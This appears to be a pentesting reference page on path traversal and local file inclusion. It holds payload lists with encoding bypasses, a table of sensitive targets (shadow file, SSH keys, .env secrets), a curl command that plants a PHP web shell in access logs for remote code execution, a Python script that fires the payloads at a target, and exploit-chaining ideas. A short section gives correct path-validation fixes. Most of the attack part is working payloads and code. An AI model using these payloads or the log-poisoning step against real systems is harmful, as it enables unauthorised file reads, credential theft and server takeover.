# Path Traversal & LFI

**Tags:** #high #critical #path-traversal #lfi #file-read #rce
**OWASP:** A01:2021 Broken Access Control
**CVSS Base:** 7.5 (High) — 9.8 (Critical — LFI to RCE)

---

## 📖 What it is

**Path Traversal:** user input is concatenated with a basePath to build a file path, without validating that the final path still resides within the allowed directory.

**LFI (Local File Inclusion):** PHP-specific — `include()` processes PHP code from a local file controlled by the attacker.

---

## 🔍 `grep_search` Tactics

```
path.join(basePath, 
readFile(dir + req.params
sendFile(
FileInputStream(base +
file_get_contents(dir.
include(
require(
include_once(
$_GET['file']
$_GET['page']
$_GET['template']
$_GET['path']
open(os.path.join(
send_from_directory(
```

---

## 💣 Path Traversal Payloads

### Classic — Linux
```
../../../../etc/passwd
../../../../etc/shadow
../../../../proc/self/environ
../../../../var/log/apache2/access.log
../../../../app/.env
../../../../home/user/.ssh/id_rsa
```

### Classic — Windows
```
..\..\..\..\Windows\System32\drivers\etc\hosts
..\..\..\..\Windows\win.ini
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\.env
```

### Filter Bypasses

```
# Double encoding (URL)
..%252F..%252F..%252Fetc%252Fpasswd

# Simple encoding
..%2F..%2F..%2Fetc%2Fpasswd

# Null byte (PHP < 5.3.4  truncates extension)
../../../../etc/passwd%00.jpg

# Double dots bypass
....//....//....//etc/passwd

# Backslash (Windows)
..\..\..\..\windows\win.ini

# Unicode / Overlong encoding
..%c0%af..%c0%af..%c0%afetc/passwd

# Mixed separators
../\../\../etc/passwd
```

---

## 🎯 High-Value Targets

### Linux
| File | Contains |
|---|---|
| `/etc/passwd` | System users, shells |
| `/etc/shadow` | Password hashes (root) |
| `/proc/self/environ` | Process environment variables |
| `/proc/self/cmdline` | Command line that started the process |
| `/proc/self/fd/X` | Open file descriptors (may include code) |
| `~/.ssh/id_rsa` | SSH private key |
| `/var/log/apache2/access.log` | Access logs (for Log Poisoning → LFI) |
| `/var/log/nginx/access.log` | Nginx logs |
| `.env` | Secrets, DATABASE_URL, API_KEYS |
| `config/database.yml` | Database credentials (Rails) |
| `/app/config.py` | Application configuration |

### Windows
| File | Contains |
|---|---|
| `C:\Windows\System32\drivers\etc\hosts` | Name resolution |
| `C:\Windows\win.ini` | Confirms path traversal on Windows |
| `C:\inetpub\wwwroot\web.config` | IIS config with connection strings |
| `C:\xampp\htdocs\config.php` | Database credentials |
| `C:\Users\Administrator\.ssh\id_rsa` | Admin SSH key |

---

## 💣 LFI → RCE (Log Poisoning Technique)

**Prerequisites:**
1. LFI confirmed
2. Read access to the web server's access logs

**Step 1 — Inject PHP code into the logs:**
```bash
# Send a request with a User-Agent containing PHP:
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/

# The User-Agent header is logged in access.log:
# 192.168.1.1 - - [17/Apr/2026] "GET / HTTP/1.1" 200 - "<?php system($_GET["cmd"]); ?>"
```

**Step 2 — Include the log via LFI:**
```
http://target.com/index.php?page=../../var/log/apache2/access.log&cmd=id
#  The PHP engine executes the injected code in the log  RCE
```

---

## 🧪 Validation Script

```python
# .tmp/validate_path_traversal.py
import requests

TARGET = "http://target.com"
ENDPOINT = "/api/download"
PARAM = "file"

PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
    "....//....//....//....//etc/passwd",
    "../../../../proc/self/environ",
]

for payload in PAYLOADS:
    try:
        r = requests.get(f"{TARGET}{ENDPOINT}", params={PARAM: payload}, timeout=5)
        if "root:" in r.text or "HTTP_" in r.text:
            print(f"[VULN] Path Traversal confirmed: {payload}")
            print(f"  Response: {r.text[:300]}")
        else:
            print(f"[safe/blocked] {payload} (status: {r.status_code})")
    except Exception as e:
        print(f"[error] {e}")
```

---

## 🛡️ Fix

```python
#  CORRECT  validate that the final path is within the basedir
import os

BASE_DIR = "/var/www/uploads"

def safe_read(user_filename: str) -> bytes:
    # Build path and resolve symlinks/..
    requested = os.path.realpath(os.path.join(BASE_DIR, user_filename))
    
    # Verify that the final path still starts with BASE_DIR
    if not requested.startswith(BASE_DIR + os.sep):
        raise ValueError(f"Path traversal detected: {requested}")
    
    with open(requested, 'rb') as f:
        return f.read()
```

```javascript
//  CORRECT  Node.js with path.resolve and prefix check
const path = require('path');
const fs = require('fs');

const BASE_DIR = '/var/www/uploads';

function safeRead(userInput) {
    const resolved = path.resolve(BASE_DIR, userInput);
    
    if (!resolved.startsWith(BASE_DIR + path.sep)) {
        throw new Error('Path traversal attempt');
    }
    
    return fs.readFileSync(resolved);
}
```

---

## 🔗 Chain Exploits

```
Path Traversal + readable .env  Database URL + API keys  full compromise
Path Traversal + SSH key  Passwordless server access
Path Traversal + source code  Analysis of hardcoded secrets in code
LFI + Log Poisoning  Full RCE (critical)
LFI + /proc/self/environ with PHP_VALUE  RCE via PHP options
Path Traversal + Docker  /proc/1/root  host access
```

---

## 📌 References
- [[command-injection-rce]]
- [[systemic-cryptography-flaws]]
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [PayloadsAllTheThings Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)